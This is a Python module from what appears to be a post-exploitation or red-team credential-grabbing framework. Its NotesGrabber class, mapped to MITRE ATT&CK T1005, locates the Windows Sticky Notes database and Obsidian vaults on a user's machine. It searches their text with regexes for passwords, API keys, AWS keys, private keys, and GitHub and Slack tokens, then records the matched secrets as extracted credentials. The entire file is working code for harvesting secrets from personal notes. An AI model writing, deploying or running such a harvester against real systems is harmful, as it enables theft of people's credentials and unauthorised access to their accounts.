"""
NotesGrabber — Extract secrets from note-taking apps

Targets:
- Windows Sticky Notes: plum.sqlite (users paste creds constantly)
- Obsidian vaults: search .md files for credential patterns
- OneNote: local cache discovery

MITRE ATT&CK: T1005 (Data from Local System)
"""

from __future__ import annotations

import os
import re

from .base import GrabberContext, GrabberModule
from .models import ExtractedCredential, GrabberResult, GrabberStatus, PrivilegeLevel
from .utils import safe_read_text, safe_sqlite_close, safe_sqlite_read

_SECRET_PATTERNS = [
    re.compile(p, re.IGNORECASE) for p in [
        r"(?:password|passwd|pwd)\s*[=:]\s*\S+",
        r"(?:api[_-]?key|token|secret)\s*[=:]\s*\S+",
        r"AKIA[0-9A-Z]{16}",
        r"-----BEGIN\s(?:RSA\s)?PRIVATE\sKEY-----",
        r"gh[ps]_[A-Za-z0-9_]{36,}",
        r"xox[bprs]-[0-9]{10,}",
    ]
]


class NotesGrabber(GrabberModule):
    name = "notes"
    description = "Extract secrets from Sticky Notes, Obsidian vaults"
    min_privilege = PrivilegeLevel.USER
    supported_platforms = ("Windows", "Darwin", "Linux")
    default_enabled = True

    _STICKY_NOTES_PATHS = [
        "{localappdata}/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/plum.sqlite",
    ]

    _OBSIDIAN_DIRS = [
        "{home}/Documents",
        "{home}/Desktop",
        "{home}/Obsidian",
    ]

    def preflight_check(self, context: GrabberContext) -> bool:
        for template in self._STICKY_NOTES_PATHS:
            path = template.format(localappdata=context.appdata_local or "", home=context.user_profile_path)
            if os.path.isfile(path):
                return True
        for template in self._OBSIDIAN_DIRS:
            path = template.format(home=context.user_profile_path)
            if os.path.isdir(path):
                return True
        return False

    def execute(self, context: GrabberContext) -> GrabberResult:
        result = GrabberResult(module_name=self.name)

        # Sticky Notes
        for template in self._STICKY_NOTES_PATHS:
            path = template.format(localappdata=context.appdata_local or "", home=context.user_profile_path)
            if os.path.isfile(path):
                creds = self._extract_sticky_notes(path)
                result.credentials.extend(creds)
                if creds:
                    result.findings.append(self.make_finding(
                        file_path=path,
                        description=f"Found {len(creds)} secret(s) in Sticky Notes",
                        score=75 * min(len(creds), 3),
                        matched_value="Sticky Notes",
                    ))

        # Obsidian vaults — scan for .obsidian marker then search .md files
        for template in self._OBSIDIAN_DIRS:
            base = template.format(home=context.user_profile_path)
            if not os.path.isdir(base):
                continue
            vaults = self._find_obsidian_vaults(base)
            for vault_path in vaults:
                creds = self._scan_vault_for_secrets(vault_path)
                result.credentials.extend(creds)
                if creds:
                    result.findings.append(self.make_finding(
                        file_path=vault_path,
                        description=f"Found {len(creds)} secret(s) in Obsidian vault",
                        score=50 * min(len(creds), 3),
                        matched_value="Obsidian",
                    ))

        result.status = GrabberStatus.COMPLETED
        return result

    def _extract_sticky_notes(self, db_path: str) -> list[ExtractedCredential]:
        """Extract notes from Sticky Notes plum.sqlite and scan for secrets."""
        creds = []
        result = safe_sqlite_read(db_path)
        if not result:
            return creds

        conn, tmp_path = result
        try:
            # Sticky Notes schema: Note table with Text column (RTF or plain)
            for table in ("Note", "note"):
                try:
                    cursor = conn.execute(f"SELECT Text FROM {table} WHERE Text IS NOT NULL")
                    for row in cursor:
                        text = row["Text"] or ""
                        # Strip RTF formatting if present
                        if text.startswith("{\\rtf"):
                            text = re.sub(r"\\[a-z]+\d*\s?|\{|\}", "", text)
                        for pattern in _SECRET_PATTERNS:
                            match = pattern.search(text)
                            if match:
                                creds.append(ExtractedCredential(
                                    source_module=self.name,
                                    credential_type="password",
                                    target_application="Sticky Notes",
                                    notes=f"Match: {match.group()[:100]}",
                                    decrypted_value=match.group()[:200],
                                    mitre_technique="T1005",
                                ))
                                break  # One match per note is enough
                    break  # Found the table
                except Exception:
                    continue
        finally:
            safe_sqlite_close(conn, tmp_path)

        return creds

    @staticmethod
    def _find_obsidian_vaults(base_dir: str, max_depth: int = 2) -> list[str]:
        """Find directories containing .obsidian marker."""
        vaults = []

        def _walk(d: str, depth: int) -> None:
            if depth > max_depth:
                return
            try:
                with os.scandir(d) as entries:
                    for entry in entries:
                        if entry.is_dir(follow_symlinks=False):
                            if entry.name == ".obsidian":
                                vaults.append(d)
                                return  # Don't recurse into a vault
                            elif not entry.name.startswith("."):
                                _walk(entry.path, depth + 1)
            except (PermissionError, OSError):
                pass

        _walk(base_dir, 0)
        return vaults

    def _scan_vault_for_secrets(self, vault_path: str, max_files: int = 100) -> list[ExtractedCredential]:
        """Scan markdown files in an Obsidian vault for credential patterns."""
        creds = []
        count = 0

        for root, dirs, files in os.walk(vault_path):
            dirs[:] = [d for d in dirs if not d.startswith(".")]
            for fname in files:
                if not fname.endswith(".md"):
                    continue
                if count >= max_files:
                    return creds
                count += 1

                content = safe_read_text(os.path.join(root, fname), max_size=1024 * 1024)
                if not content:
                    continue

                for pattern in _SECRET_PATTERNS:
                    match = pattern.search(content)
                    if match:
                        creds.append(ExtractedCredential(
                            source_module=self.name,
                            credential_type="password",
                            target_application="Obsidian",
                            notes=f"{fname}: {match.group()[:100]}",
                            decrypted_value=match.group()[:200],
                            mitre_technique="T1005",
                        ))
                        break

        return creds
